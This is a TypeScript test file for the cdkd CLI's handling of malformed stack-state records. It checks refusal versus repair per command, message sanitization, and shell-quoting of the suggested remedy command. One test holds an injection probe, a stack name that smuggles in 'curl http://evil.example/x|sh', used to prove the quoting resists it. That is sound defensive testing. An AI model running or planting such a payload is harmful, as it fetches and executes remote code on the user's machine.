import { describe, expect, it } from 'vite-plus/test';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  STATE_RESOURCES_MALFORMED,
  hasReadableResources,
  malformedResourcesWarning,
  malformedStateRefusalMessage,
  refuseMalformedState,
  repairMalformedResourcesForReadOnly,
} from '../../../src/state/malformed-resources-bag.js';
import { CdkdError } from '../../../src/utils/error-handler.js';
import type { StackState } from '../../../src/types/state.js';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

function state(resources: unknown): StackState {
  return {
    version: 10,
    stackName: 'S',
    region: 'us-east-1',
    resources: resources as StackState['resources'],
    outputs: {},
    lastModified: 0,
  };
}

/** Every shape a hand-edited record can carry that is not a readable bag. */
const UNREADABLE: ReadonlyArray<readonly [string, unknown]> = [
  ['null', null],
  ['absent', undefined],
  ['an array', []],
  ['a number', 5],
  ['a string', 'ab'],
];

describe('repairMalformedResourcesForReadOnly', () => {
  for (const [label, value] of UNREADABLE) {
    it(`repairs ${label} and reports that it did`, () => {
      const s = state(value);
      expect(repairMalformedResourcesForReadOnly(s)).toBe(true);
      expect(s.resources).toEqual({});
    });
  }

  it('leaves a populated bag byte-identical and reports no repair', () => {
    const bag = { A: { physicalId: 'p', resourceType: 'T', properties: {} } };
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    // The SAME object, not a copy: callers hold the backend's reference and an
    // etag-paired saveState must write back the record that was read.
    expect(s.resources).toBe(bag);
  });

  it('leaves an EMPTY bag alone — {} is a legitimate deployed-nothing record', () => {
    const bag = {};
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    expect(s.resources).toBe(bag);
  });
});

describe('refuseMalformedState', () => {
  for (const [label, value] of UNREADABLE) {
    it(`refuses ${label} with a named code rather than a bare TypeError`, () => {
      let thrown: unknown;
      try {
        refuseMalformedState(state(value), 'MyStack', 'eu-west-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      expect((thrown as CdkdError).message).toContain('MyStack');
      // The refusal has to say WHY a write-capable command will not proceed,
      // or it reads as the same unhelpful abort go-to-k/cdkd#3018 reported.
      expect((thrown as CdkdError).message).toContain('WRITE');
    });
  }

  it('passes a readable bag through, empty included', () => {
    expect(() => refuseMalformedState(state({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedState(state({ A: {} }), 'S', 'r')).not.toThrow();
  });
});

describe('the user-facing text', () => {
  it('names the record and forbids the two commands that would act on it', () => {
    const warning = malformedResourcesWarning('MyStack', 'eu-west-1');
    expect(warning).toContain('MyStack');
    expect(warning).toContain('eu-west-1');
    // An empty resource set is indistinguishable from a healthy empty stack in
    // every later line of output, so the warning has to say which it is.
    expect(warning).toContain('EMPTY');
    expect(warning).toContain('cdkd deploy');
    expect(warning).toContain('cdkd destroy');
  });

  it('sanitizes both interpolations — they land inside a pasteable command', () => {
    // A stack name reaches the cross-stack read path from an Fn::GetStackOutput
    // argument or an S3 key, and ConsoleLogger sanitizes a logger's extra ARGS,
    // never the message string. Unsanitized, a name could forge a line break
    // and append its own instruction to the command the text says to run, or
    // hide the real one behind an ANSI sequence.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r'];
    const hostile = `Evil${FORGERIES.join('')}Stack`;
    // Non-vacuity: the probe input must actually carry every forgery, or the
    // assertions below pass over a string that never had them.
    for (const forge of FORGERIES) {
      expect(hostile.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
    }

    const texts = [malformedResourcesWarning(hostile, hostile)];
    try {
      refuseMalformedState(state(null), hostile, hostile);
    } catch (err) {
      texts.push((err as Error).message);
    }
    expect(texts.length, 'refuseMalformedState did not throw for a null bag').toBe(2);

    for (const text of texts) {
      for (const forge of FORGERIES) {
        expect(
          text.includes(forge),
          `rendered text still carries ${JSON.stringify(forge)}: ${JSON.stringify(text)}`
        ).toBe(false);
      }
      // And the sanitizer must not have eaten the identifier entirely — the
      // message has to still name WHICH record is broken.
      expect(text).toContain('Evil');
      expect(text).toContain('Stack');
    }
  });

  it('shell-quotes the remedy, so a hostile name cannot append its own command', () => {
    // displaySafe(asciiOnly) is a printable-ASCII allowlist: it removes the
    // control-character class above but KEEPS ' ; | ` $ and spaces. The
    // previous cut wrapped the command in '...' with only that sanitizing, so
    // this name closed the quoting and appended a command to the line the text
    // tells the user to RUN.
    const INJECTION = "a'; curl http://evil.example/x|sh; echo '";
    const texts = [malformedResourcesWarning(INJECTION, 'us-east-1')];
    try {
      refuseMalformedState(state(null), INJECTION, 'us-east-1');
    } catch (err) {
      texts.push((err as Error).message);
    }
    expect(texts.length).toBe(2);

    for (const text of texts) {
      // Non-vacuity: the name must survive into the text at all, or the
      // assertion below passes over a string that never carried it.
      expect(text, 'the hostile name never reached the rendered text').toContain('curl');
      const command = text.slice(text.indexOf('cdkd state show'));
      expect(command, 'the remedy command is missing').toContain('cdkd state show');
      // Inside a single-quoted shell word, the ONLY way out is a closing quote.
      // shellQuote escapes each one as '\'' so the word never terminates early.
      const bare = command.match(/cdkd state show (\S+|'(?:[^']|'\\'')*')/);
      expect(bare, `remedy argument is not a single shell word: ${command}`).not.toBeNull();
      expect(
        command.includes("|sh") && !command.includes("'\\''"),
        `the remedy still carries an unescaped injection: ${command}`
      ).toBe(false);
    }
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
    // An empty argument makes --stack-region swallow --json, turning a remedy
    // into a differently-broken command.
    const text = malformedResourcesWarning('\u0000\u0001', '\u0002');
    expect(text).toContain('<unrenderable>');
    expect(text, 'an empty argument collapsed the flags').not.toContain('--stack-region --json');
  });

  it('carries the generic exit code — scrub needs a different one and says so', () => {
    // `refuseMalformedState` is a plain CdkdError (exit 1, the generic error).
    // That is right for import / orphan / rollback, and WRONG for scrub, whose
    // exit 1 means "--fail found plaintext" — so scrub raises its own exit-2
    // class around `malformedStateRefusalMessage` instead. A single shared
    // code would be wrong in the other direction too: `cdkd rollback`
    // documents 2 as "PARTIAL — journal kept, idempotent re-run", which would
    // tell an operator to re-run a command that attempted nothing.
    let thrown: CdkdError | undefined;
    try {
      refuseMalformedState(state(null), 'S', 'r');
    } catch (err) {
      thrown = err as CdkdError;
    }
    expect(thrown).toBeDefined();
    expect(
      (thrown as unknown as { exitCode?: number }).exitCode,
      'refuseMalformedState now pins an exitCode; check it against EACH refusing command’s ' +
        'documented contract before adopting it — they disagree.'
    ).toBeUndefined();

    // Both spellings say the same thing, so scrub's copy cannot drift.
    expect(thrown?.message).toContain(malformedStateRefusalMessage('S', 'r'));
  });

  it('hasReadableResources is exported, because scrub branches on it directly', () => {
    expect(hasReadableResources(state(null))).toBe(false);
    expect(hasReadableResources(state({}))).toBe(true);
  });

  it('every scrubStack return AFTER the repair carries the finding', () => {
    // The first cut of this signal patched the SAME early-return arm twice and
    // missed the main success path, so a stack whose bag was repaired AND
    // whose outputs held a secret returned without the flag and the finding
    // was lost.
    //
    // Counted on a REQUIRED field rather than by brace-matching the returns: a
    // `[\s\S]*?` span ran past an arm's closing brace and swallowed the next
    // one, which made this fence red for the wrong reason while looking right.
    // `unverifiableReads` appears exactly once per ScrubStackResult literal.
    const src = readFileSync(join(repoRoot, 'src/cli/commands/scrub.ts'), 'utf8');
    const repairAt = src.indexOf('repairMalformedResourcesForReadOnly(state)');
    expect(repairAt, 'scrub no longer repairs under --dry-run').toBeGreaterThan(-1);
    const endAt = src.indexOf('THE MASKING BOUNDARY', repairAt);
    expect(endAt, "scrubStack's masking-boundary catch moved; this fence's end anchor is gone").
      toBeGreaterThan(repairAt);

    const body = src.slice(repairAt, endAt);

    // PER LITERAL, not a union total. B1 was a DISTRIBUTION defect — one arm
    // carried the spread twice and the other zero — so `2 spreads across 2
    // literals` was true of the BUG and of the fix alike, and a summed fence
    // passes on the source it exists to reject (measured against both blobs).
    // Splitting on the required field and counting inside each literal is what
    // makes `[2, 0]` distinguishable from `[1, 1]`.
    const perLiteral = body
      .split('unverifiableReads:')
      .slice(1)
      .map((rest) => {
        const close = rest.indexOf('};');
        const literal = close >= 0 ? rest.slice(0, close) : rest;
        return literal.split('malformedResources ? { malformedResources }').length - 1;
      });

    expect(
      perLiteral.length,
      'found fewer than two ScrubStackResult literals after the repair; this fence is ' +
        'asserting nothing'
    ).toBeGreaterThanOrEqual(2);
    expect(
      perLiteral,
      `each ScrubStackResult returned after the repair must carry \`malformedResources\` ` +
        `exactly once; got ${JSON.stringify(perLiteral)}. A zero means a stack whose resources ` +
        `bag was repaired can return through that arm with the finding LOST — ` +
        `\`--dry-run --fail\` then reports a clean run over a record it never read ` +
        `(go-to-k/cdkd#3018). A two means a duplicate spread, which is how the missing one was ` +
        `masked the first time.`
    ).toEqual(perLiteral.map(() => 1));
  });

  it('the malformed-record finding is raised INSIDE the --dry-run branch', () => {
    // The finding is set ONLY under `--dry-run`, and `scrubCommand`'s dry-run
    // branch RETURNS -- so a throw placed after that branch is dead code for
    // it. The first cut did exactly that: `--dry-run --fail` then exited 1 via
    // `ScrubNeededError`, the code reserved for "scrub looked and found a leak
    // -- rotate the secret", which is the opposite remedy; and because that
    // error is `silent: true`, the finding's message never printed either.
    //
    // A source-shape check is what fits here: the defect is the POSITION of a
    // throw relative to a `return`, and `scrubCommand` is behind synthesis.
    const src = readFileSync(join(repoRoot, 'src/cli/commands/scrub.ts'), 'utf8');
    const branchAt = src.indexOf('if (options.dryRun) {');
    expect(branchAt, "scrubCommand's --dry-run branch is gone or renamed").toBeGreaterThan(-1);
    const returnAt = src.indexOf('\n    return;', branchAt);
    expect(returnAt, "the --dry-run branch's own return is gone").toBeGreaterThan(branchAt);

    const branch = src.slice(branchAt, returnAt);
    expect(
      branch,
      'the malformed-record finding is not raised inside the --dry-run branch. It can only be ' +
        'SET under --dry-run, and that branch returns, so a throw below it never runs: the run ' +
        'exits 0, or 1 via the SILENT ScrubNeededError, whose code means the opposite remedy ' +
        '(go-to-k/cdkd#3018).'
    ).toContain('malformedRecords.length > 0');

    // And ABOVE the --fail gate, or ScrubNeededError wins the race and
    // swallows the message.
    expect(
      branch.indexOf('malformedRecords.length > 0'),
      'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
        'first and reports "scrub found a leak" for a record scrub could not read.'
    ).toBeLessThan(branch.indexOf('if (options.fail)'));
  });
});

/**
 * WHICH helper each call site gets is the whole safety property, and the first
 * round of go-to-k/cdkd#3018 got it wrong in the dangerous direction: it
 * REPAIRED on `cdkd scrub`, whose `saveState` is gated on `recordsChanged > 0`
 * — satisfied by an OUTPUTS change alone — so a record holding
 * `"resources": null` plus a plaintext secret in `outputs` would have been
 * scrubbed and then saved back with a well-formed `resources: {}`. That
 * launders the only signal anything is wrong: the next `cdkd deploy` reads
 * zero resources and re-CREATES the stack, and the next `cdkd destroy` orphans
 * every live resource.
 *
 * So the rule is mechanical — a command that can WRITE state refuses; only a
 * read-only one repairs — and these cases pin each site to the right side of
 * it.
 */
describe('write-capable commands refuse; read-only ones repair', () => {
  const REFUSE = [
    'src/cli/commands/scrub.ts',
    'src/cli/commands/import.ts',
    'src/cli/commands/orphan.ts',
    // Added in round 3: `{...null}` yields `{}` and throws nothing, so this
    // one launders silently — in the command that runs precisely when state is
    // already suspect.
    'src/cli/commands/rollback.ts',
  ];
  const REPAIR = ['src/cli/commands/diff-recursive.ts'];

  for (const file of REFUSE) {
    it(`${file} REFUSES — it can saveState`, () => {
      const src = readFileSync(join(repoRoot, file), 'utf8');
      // TWO spellings count as refusing. Most files call the shared helper;
      // `scrub` branches on the exported predicate and raises its OWN exit-2
      // class, because its exit 1 is spoken for ("--fail found plaintext").
      // Both must carry the same MESSAGE, which the exit-code case pins.
      const refuses =
        src.includes('refuseMalformedState(') ||
        (src.includes('hasReadableResources(') && src.includes('malformedStateRefusalMessage('));
      expect(
        refuses,
        `${file} calls saveState, so a malformed record must be refused, not repaired: saving ` +
          `over it would replace the evidence with a well-formed empty bag permanently. Call ` +
          `refuseMalformedState(), or branch on hasReadableResources() and raise your own ` +
          `class around malformedStateRefusalMessage().`
      ).toBe(true);
      // `scrub` is the one file legitimately holding BOTH: its write gate is
      // `recordsChanged > 0 && !opts.dryRun`, so under `--dry-run` it provably
      // cannot persist and repairing preserves the audit. Any OTHER
      // write-capable file holding the repair helper is the round-2 defect.
      if (file !== 'src/cli/commands/scrub.ts') {
        expect(
          src.includes('repairMalformedResourcesForReadOnly'),
          `${file} repairs a malformed resources bag but can also WRITE state.`
        ).toBe(false);
      } else {
        // NOT `toContain('!opts.dryRun')`: the doc comment beside the branch
        // quotes that gate verbatim, so the assertion passed on the PROSE —
        // delete the runtime gate, keep the comment, fence stays green. Pin
        // the two things that actually make the exception sound, each as a
        // statement rather than as explanation: the lock is not taken under
        // --dry-run, and the save is gated on it.
        expect(src, 'scrub no longer skips the lock under --dry-run').toMatch(
          /acquired\s*=\s*!opts\.dryRun/
        );
        expect(src, "scrub's saveState is no longer gated on !opts.dryRun").toMatch(
          /recordsChanged > 0 && !opts\.dryRun/
        );
        // And the repair must not be able to end in a clean verdict — the
        // finding has to reach a non-zero exit (go-to-k/cdkd#3018 round 4).
        expect(
          src,
          'a --dry-run that repaired a malformed bag no longer raises; `--dry-run --fail` would ' +
            'report a CI-green clean run over a record whose resources it never read.'
        ).toContain('malformedRecords.length > 0');
      }
      // The premise of the rule, asserted rather than assumed — if this file
      // stops writing state the classification should be revisited, not
      // silently inherited.
      expect(src, `${file} no longer calls saveState`).toContain('saveState(');
    });
  }

  // `diff-recursive.ts` hands the repaired record to `diff.ts`, which is where
  // the top-level command lives. The repair is only safe while NEITHER writes,
  // so the consumer is fenced alongside the producer rather than reasoned about.
  it('src/cli/commands/diff.ts consumes a repaired record and must not write either', () => {
    const src = readFileSync(join(repoRoot, 'src/cli/commands/diff.ts'), 'utf8');
    // A write would arrive through a helper, not necessarily through a literal
    // `saveState(` in this file — so the three helpers that own one are fenced
    // by IMPORT as well.
    for (const writer of ['ExportIndexStore', 'LockManager', 'DeploymentEventsStore']) {
      expect(
        src.includes(writer),
        `src/cli/commands/diff.ts now imports ${writer}, which can persist. It consumes ` +
          `records repaired by diff-recursive.ts, so any write from this file can launder a ` +
          `merely-unreadable record into a well-formed empty one.`
      ).toBe(false);
    }
    expect(
      src.includes('saveState('),
      `src/cli/commands/diff.ts now writes state. It receives records repaired by ` +
        `diff-recursive.ts's loadStateOrEmpty, so writing one back would save a well-formed ` +
        `empty bag over a merely-unreadable record — the laundering go-to-k/cdkd#3018's fix ` +
        `refuses everywhere else.`
    ).toBe(false);
  });

  for (const file of REPAIR) {
    it(`${file} REPAIRS — it never writes`, () => {
      const src = readFileSync(join(repoRoot, file), 'utf8');
      expect(src).toContain('repairMalformedResourcesForReadOnly(');
      expect(src).toContain('malformedResourcesWarning(');
      expect(
        src.includes('saveState('),
        `${file} now writes state, so repairing a malformed bag there can launder the record ` +
          `— it must refuse instead.`
      ).toBe(false);
    });
  }
});
